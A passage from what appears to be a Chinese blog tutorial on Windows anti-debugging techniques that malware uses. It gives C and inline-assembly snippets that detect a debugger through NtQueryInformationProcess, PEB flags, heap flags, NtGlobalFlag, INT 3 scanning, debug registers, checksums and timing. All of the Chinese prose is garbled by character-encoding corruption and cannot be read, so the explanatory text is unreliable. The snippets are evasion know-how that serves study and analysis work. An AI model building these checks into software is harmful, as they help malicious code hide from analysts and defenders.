å‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºçš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">[<span class="hljs-keyword">out</span>, <span class="hljs-keyword">optional</span>] ReturnLength<br></code></pre></td></tr></table></figure><p>æŒ‡å‘å˜é‡çš„æŒ‡é’ˆï¼Œå…¶ä¸­å‡½æ•°è¿”å›æ‰€è¯·æ±‚ä¿¡æ¯çš„å¤§å°ã€‚ å¦‚æœå‡½æ•°æˆåŠŸï¼Œåˆ™è¿™æ˜¯ <em>ç”± ProcessInformation</em> å‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºä¸­å†™å…¥çš„ä¿¡æ¯çš„å¤§å° (å¦‚æœç¼“å†²åŒºå¤ªå°ï¼Œåˆ™ä¸ºæˆåŠŸæ¥æ”¶ä¿¡æ¯) æ‰€éœ€çš„æœ€å°ç¼“å†²åŒºå¤§å°ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span> &#123;<br><br><span class="hljs-type">int</span> debugFlag = <span class="hljs-number">0</span>;<br>HMODULE hModule = LoadLibrary(TEXT(<span class="hljs-string">&quot;Ntdll.dll&quot;</span>));<br>NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br>NtQueryInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)<span class="hljs-number">0x1f</span>, &amp;debugFlag, <span class="hljs-keyword">sizeof</span>(debugFlag), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; debugFlag &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> debugFlag == <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">if</span> (CheckDebug()) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HACK\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HELLO WORLD\n&quot;</span>);<br>&#125;<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-GetLastError"><a href="#4-GetLastError" class="headerlink" title="4.GetLastError"></a>4.GetLastError</h3><p>åœ¨ç¨‹åºå‡ºç°é”™è¯¯æ—¶ï¼ŒMSDNä¼šæŒ‡å‡ºä½¿ç”¨<code>GetLastError()</code>å‡½æ•°æ¥è·å¾—é”™è¯¯åŸå› ã€‚è€Œè°ƒè¯•å™¨æ•è·å¼‚å¸¸åï¼Œå¹¶ä¸ä¼šç«‹å³è®²å¤„ç†æƒäº¤ç»™è¿›ç¨‹å¤„ç†ï¼Œè€Œæ˜¯è‡ªå·±å…ˆæ¥ç®¡ã€‚å¤šæ•°è°ƒè¯•å™¨é»˜è®¤çš„è®¾ç½®æ˜¯æ•è·å¼‚å¸¸åä¸å°†å¼‚å¸¸ä¼ é€’ç»™åº”ç”¨ç¨‹åºã€‚å¦‚æœè°ƒè¯•å™¨ä¸èƒ½å°†å¼‚å¸¸ç»“æœæ­£ç¡®è¿”å›åˆ°è¢«è°ƒè¯•è¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ç§å¼‚å¸¸å¤±æ•ˆå¯ä»¥è¢«è¿›ç¨‹å†…éƒ¨çš„å¼‚å¸¸å¤„ç†æœºåˆ¶æ¢æµ‹ï¼Œæ®æ­¤å°±å¯ä»¥åˆ©ç”¨å¼‚å¸¸æ¥å®ç°åè°ƒè¯•æŠ€æœ¯ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br>BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span><br>&#123;<br>DWORD ret = CloseHandle((HANDLE)<span class="hljs-number">0x1234</span>);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span> || GetLastError() != ERROR_INVALID_HANDLE)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><br><span class="hljs-keyword">if</span> (CheckDebug())<br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;True&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æ²¡æœ‰è°ƒè¯•&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="äºŒã€æ‰‹åŠ¨æ£€æµ‹æ•°æ®ç»“æ„"><a href="#äºŒã€æ‰‹åŠ¨æ£€æµ‹æ•°æ®ç»“æ„" class="headerlink" title="äºŒã€æ‰‹åŠ¨æ£€æµ‹æ•°æ®ç»“æ„"></a>äºŒã€æ‰‹åŠ¨æ£€æµ‹æ•°æ®ç»“æ„</h2><p>é™¤äº†ä½¿ç”¨APIæ£€æµ‹ï¼Œä¹Ÿå¯ä»¥æ˜¯æ‰‹åŠ¨æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯è‡ªå·±å»æ£€æŸ¥çº¿ç¨‹ç¯å¢ƒå—ç­‰ç›¸å…³ä¿¡æ¯</p><h3 id="1-æ£€æµ‹BeingDebuggedå±æ€§"><a href="#1-æ£€æµ‹BeingDebuggedå±æ€§" class="headerlink" title="1.æ£€æµ‹BeingDebuggedå±æ€§"></a>1.æ£€æµ‹BeingDebuggedå±æ€§</h3><p>Windowsæ“ä½œç³»ç»Ÿç»´æŠ¤ç€æ¯ä¸ªæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹çš„PEBç»“æ„ï¼Œå®ƒåŒ…å«ä¸è¿™ä¸ªè¿›ç¨‹ç›¸å…³çš„æ‰€æœ‰ç”¨æˆ·æ€å‚æ•°ã€‚è¿™äº›å‚æ•°åŒ…æ‹¬è¿›ç¨‹ç¯å¢ƒæ•°æ®ï¼Œç¯å¢ƒæ•°æ®åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€åŠ è½½çš„æ¨¡å—åˆ—è¡¨ã€å†…å­˜åœ°å€ï¼Œä»¥åŠè°ƒè¯•å™¨çŠ¶æ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">PEB</span> &#123;</span><br>  BYTE                          Reserved1[<span class="hljs-number">2</span>];<br>  BYTE                          BeingDebugged;<br>  BYTE                          Reserved2[<span class="hljs-number">1</span>];<br>  PVOID                         Reserved3[<span class="hljs-number">2</span>];<br>  PPEB_LDR_DATA                 Ldr;<br>  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;<br>  PVOID                         Reserved4[<span class="hljs-number">3</span>];<br>  PVOID                         AtlThunkSListPtr;<br>  PVOID                         Reserved5;<br>  ULONG                         Reserved6;<br>  PVOID                         Reserved7;<br>  ULONG                         Reserved8;<br>  ULONG                         AtlThunkSListPtr32;<br>  PVOID                         Reserved9[<span class="hljs-number">45</span>];<br>  BYTE                          Reserved10[<span class="hljs-number">96</span>];<br>  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;<br>  BYTE                          Reserved11[<span class="hljs-number">128</span>];<br>  PVOID                         Reserved12[<span class="hljs-number">1</span>];<br>  ULONG                         SessionId;<br>&#125; PEB, *PPEB;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ—¶ï¼Œ<code>fs:[0x30]</code>å§‹ç»ˆæŒ‡å‘PEBåŸºå€ï¼Œä¸ºäº†å®ç°åè°ƒè¯•æŠ€æœ¯ï¼Œæ¶æ„ä»£ç å¯ä»¥é€šè¿‡è¿™ä¸ªä½ç½®æ£€æŸ¥<code>BeingDebugged</code>æ ‡å¿—ï¼Œæ¥åˆ¤æ–­æ˜¯å¦è¢«è°ƒè¯•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        mov eax, fs:[<span class="hljs-number">30</span>h]  <br>        mov al, BYTE PTR [eax + <span class="hljs-number">2</span>]   <br>        mov result, al  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-æ£€æµ‹ProcessHeapå±æ€§"><a href="#2-æ£€æµ‹ProcessHeapå±æ€§" class="headerlink" title="2.æ£€æµ‹ProcessHeapå±æ€§"></a>2.æ£€æµ‹ProcessHeapå±æ€§</h3><p>Reservedæ•°ç»„ä¸­æœ‰ä¸€ä¸ªæœªå…¬å¼€çš„ä½ç½®å«åšProcessHeapï¼Œå®ƒè¢«è®¾ç½®ä¸ºåŠ è½½å™¨ä¸ºè¿›ç¨‹åˆ†é…çš„ç¬¬ä¸€ä¸ªå †çš„ä½ç½®</p><p>è¿™ä¸ªProcessHeapä½äºPEBç»“æ„çš„0x18å¤„ï¼Œç¬¬ä¸€ä¸ªå †å¤´éƒ¨æœ‰ä¸€ä¸ªå±æ€§å­—æ®µï¼Œå®ƒå‘Šè¯‰å†…æ ¸è¿™ä¸ªå †æ˜¯å¦åœ¨è°ƒè¯•å™¨ä¸­åˆ›å»ºï¼Œè¿™äº›å±æ€§å«åš<code>ForeceFlags</code>å’Œ<code>Flags</code>ï¼Œåœ¨Windows XPç³»ç»Ÿä¸­ï¼Œ<code>ForeceFlags</code>å±æ€§ä½äºå †å¤´éƒ¨åç§»<code>0x10</code>å¤„ï¼Œ<code>Flags</code>ä½äºåç§»<code>0x0C</code>å¤„ï¼Œåœ¨Win7ä»¥ä¸Šç³»ç»Ÿä¸­ï¼Œ<code>ForeceFlags</code>ä½äºå †å¤´éƒ¨åç§»<code>0x44</code>å¤„ï¼Œ<code>Flags</code>ä½äºåç§»<code>0x40</code>å¤„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>  <br>        __asm  <br>        &#123;  <br>            mov eax, fs:[<span class="hljs-number">30</span>h]  <br>            mov eax, [eax + <span class="hljs-number">18</span>h]  <br>            mov eax, [eax + <span class="hljs-number">44</span>h]  <span class="hljs-comment">//æ£€æµ‹ForeceFlagså±æ€§</span><br>            mov result, eax  <br>        &#125;    <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>  <br>        __asm  <br>        &#123;  <br>            mov eax, fs:[<span class="hljs-number">30</span>h]  <br>            mov eax, [eax + <span class="hljs-number">18</span>h]  <br>            mov eax, [eax + <span class="hljs-number">40</span>h]  <span class="hljs-comment">//æ£€æµ‹Flags</span><br>            mov result, eax  <br>        &#125;    <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">2</span>;<span class="hljs-comment">//ä¸2æ¯”è¾ƒ  </span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-æ£€æµ‹NTGlobalFlagå±æ€§"><a href="#3-æ£€æµ‹NTGlobalFlagå±æ€§" class="headerlink" title="3.æ£€æµ‹NTGlobalFlagå±æ€§"></a>3.æ£€æµ‹NTGlobalFlagå±æ€§</h3><p>ç”±äºè°ƒè¯•å™¨ä¸­å¯åŠ¨è¿›ç¨‹ä¸æ­£å¸¸æ¨¡å¼ä¸‹å¯åŠ¨è¿›ç¨‹æœ‰äº›ä¸åŒï¼Œæ‰€ä»¥å®ƒä»¬åˆ›å»ºå†…å­˜å †çš„æ–¹å¼ä¹Ÿä¸åŒã€‚ç³»ç»Ÿä½¿ç”¨PEBç»“æ„åç§»é‡0x68å¤„çš„ä¸€ä¸ªæœªå…¬å¼€ä½ç½®ï¼Œæ¥å†³å®šå¦‚ä½•åˆ›å»ºå †ç»“æ„ã€‚å¦‚æœè¿™ä¸ªä½ç½®çš„å€¼ä¸º0x70ï¼Œæˆ‘ä»¬å°±çŸ¥é“è¿›ç¨‹æ­£è¿è¡Œåœ¨è°ƒè¯•å™¨ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        mov eax, fs:[<span class="hljs-number">30</span>h]  <br>        mov eax, [eax + <span class="hljs-number">68</span>h]  <br>        and eax, <span class="hljs-number">0x70</span>  <br>        mov result, eax  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> result != <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>æ“ä½œç³»ç»Ÿåˆ›å»ºå †æ—¶ï¼Œå€¼0x70æ˜¯ä¸‹åˆ—æ ‡å¿—çš„ä¸€ä¸ªç»„åˆã€‚å¦‚æœè¿›ç¨‹ä»è°ƒè¯•å™¨å¯åŠ¨ï¼Œé‚£ä¹ˆè¿›ç¨‹çš„è¿™äº›æ ‡å¿—å°†è¢«è®¾ç½®ã€‚<br>(FLG_HEAP_ENABLE_TAIL_CHECK|FLG_HEAP_ENABLE_FREE_CHECK|FLG_HEAP_VALIDATE_PARAMETERS)</p><h2 id="ä¸‰ã€è¯†åˆ«è°ƒè¯•å™¨è¡Œä¸º"><a href="#ä¸‰ã€è¯†åˆ«è°ƒè¯•å™¨è¡Œä¸º" class="headerlink" title="ä¸‰ã€è¯†åˆ«è°ƒè¯•å™¨è¡Œä¸º"></a>ä¸‰ã€è¯†åˆ«è°ƒè¯•å™¨è¡Œä¸º</h2><h3 id="1-è½¯ä»¶æ–­ç‚¹æ£€æŸ¥"><a href="#1-è½¯ä»¶æ–­ç‚¹æ£€æŸ¥" class="headerlink" title="1.è½¯ä»¶æ–­ç‚¹æ£€æŸ¥"></a>1.è½¯ä»¶æ–­ç‚¹æ£€æŸ¥</h3><p>è°ƒè¯•å™¨è®¾ç½®æ–­ç‚¹çš„åŸºæœ¬æœºåˆ¶æ˜¯ç”¨è½¯ä»¶ä¸­æ–­æŒ‡ä»¤INT 3ä¸´æ—¶æ›¿æ¢è¿è¡Œç¨‹åºä¸­çš„ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åå½“ç¨‹åºè¿è¡Œåˆ°è¿™æ¡æŒ‡ä»¤æ—¶ï¼Œè°ƒç”¨è°ƒè¯•å¼‚å¸¸å¤„ç†ä¾‹ç¨‹ã€‚</p><p>INT 3æŒ‡ä»¤çš„æœºå™¨ç æ˜¯0xCCï¼Œå› æ­¤æ— è®ºä½•æ—¶ï¼Œä½¿ç”¨è°ƒè¯•å™¨è®¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œå®ƒéƒ½ä¼š<strong>æ’å…¥ä¸€ä¸ª0xCC</strong>æ¥ä¿®æ”¹ä»£ç ã€‚</p><p>æ¶æ„ä»£ç å¸¸ç”¨çš„ä¸€ç§åè°ƒè¯•æŠ€æœ¯æ˜¯åœ¨å®ƒçš„ä»£ç ä¸­æŸ¥æ‰¾æœºå™¨ç 0xCCï¼Œæ¥æ‰«æè°ƒè¯•å™¨å¯¹å®ƒä»£ç çš„INT 3ä¿®æ”¹ã€‚</p><p>repne scasbæŒ‡ä»¤ç”¨äºåœ¨ä¸€æ®µæ•°æ®ç¼“å†²åŒºä¸­æœç´¢ä¸€ä¸ªå­—èŠ‚ã€‚EDIéœ€æŒ‡å‘ç¼“å†²åŒºåœ°å€ï¼ŒALåˆ™åŒ…å«è¦æ‰¾çš„å­—èŠ‚ï¼ŒECXè®¾ä¸ºç¼“å†²åŒºçš„é•¿åº¦ã€‚å½“ECX&#x3D;0æˆ–æ‰¾åˆ°è¯¥å­—èŠ‚æ—¶ï¼Œæ¯”è¾ƒåœæ­¢ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CheckDebug</span><span class="hljs-params">()</span>  </span><br><span class="hljs-function"></span>&#123;  <br>    PIMAGE_DOS_HEADER pDosHeader;  <br>    PIMAGE_NT_HEADERS32 pNtHeaders;  <br>    PIMAGE_SECTION_HEADER pSectionHeader;  <br>    DWORD dwBaseImage = (DWORD)<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-literal">NULL</span>);   <br>    pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;  <br>    pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);  <br>    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-built_in">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="hljs-built_in">sizeof</span>(IMAGE_FILE_HEADER) +   <br>                     (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);  <br>    DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;   <br>    DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;      <br>    BOOL Found = FALSE;  <br>    __asm  <br>    &#123;  <br>        cld               <br>        mov     edi,dwAddr  <br>        mov     ecx,dwCodeSize  <br>        mov     al,<span class="hljs-number">0</span>CCH   <br>        repne   scasb  <br>        jnz     NotFound  <br>        mov Found,<span class="hljs-number">1</span>  <br>NotFound:           <br>    &#125;  <br>    <span class="hljs-keyword">return</span> Found;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ç¡¬ä»¶æ–­ç‚¹æ£€æŸ¥"><a href="#2-ç¡¬ä»¶æ–­ç‚¹æ£€æŸ¥" class="headerlink" title="2.ç¡¬ä»¶æ–­ç‚¹æ£€æŸ¥"></a>2.ç¡¬ä»¶æ–­ç‚¹æ£€æŸ¥</h3><p>DR0ã€Dr1ã€Dr2ã€Dr3ç”¨äºè®¾ç½®ç¡¬ä»¶æ–­ç‚¹ï¼Œ<strong>ç”±äºåªæœ‰4ä¸ªç¡¬ä»¶æ–­ç‚¹å¯„å­˜å™¨</strong>ï¼Œæ‰€ä»¥åŒæ—¶æœ€å¤šåªèƒ½è®¾ç½®4ä¸ªç¡¬ä»¶æ–­ç‚¹ã€‚DR4ã€DR5ç”±ç³»ç»Ÿä¿ç•™ã€‚  DR6ã€DR7ç”¨äºè®°å½•Dr0-Dr3ä¸­æ–­ç‚¹çš„ç›¸å…³å±æ€§ã€‚å¦‚æœæ²¡æœ‰ç¡¬ä»¶æ–­ç‚¹ï¼Œé‚£ä¹ˆDR0ã€DR1ã€DR2ã€DR3è¿™4ä¸ªå¯„å­˜å™¨çš„å€¼éƒ½ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    CONTEXT context;    <br>    HANDLE hThread = GetCurrentThread();    <br>    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;    <br>    GetThreadContext(hThread, &amp;context);    <br>    <span class="hljs-keyword">if</span> (context.Dr0 != <span class="hljs-number">0</span> || context.Dr1 != <span class="hljs-number">0</span> || context.Dr2 != <span class="hljs-number">0</span> || context.Dr3!=<span class="hljs-number">0</span>)     <br>    &#123;    <br>        <span class="hljs-keyword">return</span> TRUE;    <br>    &#125;    <br>    <span class="hljs-keyword">return</span> FALSE;    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-æ‰§è¡Œä»£ç æ ¡éªŒå’Œæ£€æŸ¥"><a href="#3-æ‰§è¡Œä»£ç æ ¡éªŒå’Œæ£€æŸ¥" class="headerlink" title="3. æ‰§è¡Œä»£ç æ ¡éªŒå’Œæ£€æŸ¥"></a>3. æ‰§è¡Œä»£ç æ ¡éªŒå’Œæ£€æŸ¥</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">CheckDebug</span><span class="hljs-params">()</span>  <br>&#123;  <br>    PIMAGE_DOS_HEADER pDosHeader;  <br>    PIMAGE_NT_HEADERS32 pNtHeaders;  <br>    PIMAGE_SECTION_HEADER pSectionHeader;  <br>    DWORD dwBaseImage = (DWORD)GetModuleHandle(<span class="hljs-literal">NULL</span>);   <br>    pDosHeader = (PIMAGE_DOS_HEADER)dwBaseImage;  <br>    pNtHeaders = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);  <br>    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + <span class="hljs-keyword">sizeof</span>(pNtHeaders-&gt;Signature) + <span class="hljs-keyword">sizeof</span>(IMAGE_FILE_HEADER) + (WORD)pNtHeaders-&gt;FileHeader.SizeOfOptionalHeader);  <br>    DWORD dwAddr = pSectionHeader-&gt;VirtualAddress + dwBaseImage;   <br>    DWORD dwCodeSize = pSectionHeader-&gt;SizeOfRawData;      <br>    DWORD checksum = <span class="hljs-number">0</span>;  <br>    __asm  <br>    &#123;  <br>        cld  <br>        mov     esi, dwAddr  <br>        mov     ecx, dwCodeSize  <br>        xor eax, eax  <br>    checksum_loop :  <br>        movzx    ebx, byte ptr[esi]  <br>        add        eax, ebx  <br>        rol eax, <span class="hljs-number">1</span>  <br>        inc esi  <br>        loop       checksum_loop  <br>        mov checksum, eax  <br>    &#125;  <br>    <span class="hljs-keyword">if</span> (checksum != <span class="hljs-number">0x46ea24</span>)  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> FALSE;  <br>    &#125;  <br>    <span class="hljs-keyword">else</span>  <br>    &#123;  <br>        <span class="hljs-keyword">return</span> TRUE;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-æ—¶é’Ÿæ£€æµ‹"><a href="#4-æ—¶é’Ÿæ£€æµ‹" class="headerlink" title="4. æ—¶é’Ÿæ£€æµ‹"></a>4. æ—¶é’Ÿæ£€æµ‹</h3><p>è¢«è°ƒè¯•æ—¶ï¼Œè¿›ç¨‹çš„è¿è¡Œé€Ÿåº¦å¤§å¤§é™ä½ï¼Œä¾‹å¦‚ï¼Œå•æ­¥è°ƒè¯•å¤§å¹…é™ä½æ¶æ„ä»£ç çš„è¿è¡Œé€Ÿåº¦ï¼Œæ‰€ä»¥æ—¶é’Ÿæ£€æµ‹æ˜¯æ¶æ„ä»£ç æ¢æµ‹è°ƒè¯•å™¨å­˜åœ¨çš„æœ€å¸¸ç”¨æ–¹å¼ä¹‹ä¸€ã€‚æœ‰å¦‚ä¸‹ä¸¤ç§ç”¨æ—¶é’Ÿæ£€æµ‹æ¥æ¢æµ‹è°ƒè¯•å™¨å­˜åœ¨çš„æ–¹æ³•ã€‚<br><strong>è®°å½•ä¸€æ®µæ“ä½œå‰åçš„æ—¶é—´æˆ³ï¼Œç„¶åæ¯”è¾ƒè¿™ä¸¤ä¸ªæ—¶é—´æˆ³ï¼Œå¦‚æœå­˜åœ¨æ»åï¼Œåˆ™å¯ä»¥è®¤ä¸ºå­˜åœ¨è°ƒè¯•å™¨ã€‚</strong><br><strong>è®°å½•è§¦å‘ä¸€ä¸ªå¼‚å¸¸å‰åçš„æ—¶é—´æˆ³ã€‚å¦‚æœä¸è°ƒè¯•è¿›ç¨‹ï¼Œå¯ä»¥å¾ˆå¿«å¤„ç†å®Œå¼‚å¸¸ï¼Œå› 